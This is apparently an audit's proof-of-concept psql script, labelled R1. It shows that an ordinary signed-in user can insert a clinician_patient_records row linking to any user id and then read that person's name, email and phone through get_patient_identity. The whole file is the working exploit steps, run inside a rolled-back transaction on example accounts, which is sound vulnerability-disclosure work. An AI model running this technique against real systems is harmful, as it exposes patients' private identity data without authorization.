-- R1: get_patient_identity trusts clinician_patient_records.linked_user_id,
-- which any signed-in user can set to any uuid on a row they insert.
\set ON_ERROR_STOP 1
\pset footer off
BEGIN;

-- Fixtures, as superuser.
INSERT INTO auth.users (id, email, email_confirmed_at) VALUES
  ('a1000000-0000-4000-8000-000000000001', 'nobody@example.com', now()),
  ('b2000000-0000-4000-8000-000000000002', 'vera@example.com',   now());
INSERT INTO public.profiles (user_id, name, email, phone_number) VALUES
  ('a1000000-0000-4000-8000-000000000001', 'No Relationship', 'nobody@example.com', NULL),
  ('b2000000-0000-4000-8000-000000000002', 'Vera Victim', 'vera@example.com', '+1 555 0100')
ON CONFLICT (user_id) DO UPDATE
  SET name = EXCLUDED.name, email = EXCLUDED.email, phone_number = EXCLUDED.phone_number;

-- The attacker: an ordinary signed-in account. No share, no practice, no clinician profile.
SELECT set_config('request.jwt.claim.sub', 'a1000000-0000-4000-8000-000000000001', true);
SET LOCAL ROLE authenticated;

\echo '--- 1. before: attacker asks for the victim''s identity'
SELECT * FROM public.get_patient_identity(ARRAY['b2000000-0000-4000-8000-000000000002'::uuid]);

\echo '--- 2. attacker inserts a staging record pointing at the victim (RLS applies)'
INSERT INTO public.clinician_patient_records (clinician_user_id, patient_name, linked_user_id)
VALUES ('a1000000-0000-4000-8000-000000000001', 'x', 'b2000000-0000-4000-8000-000000000002')
RETURNING clinician_user_id, linked_user_id;

\echo '--- 3. after: same call'
SELECT * FROM public.get_patient_identity(ARRAY['b2000000-0000-4000-8000-000000000002'::uuid]);

RESET ROLE;
ROLLBACK;
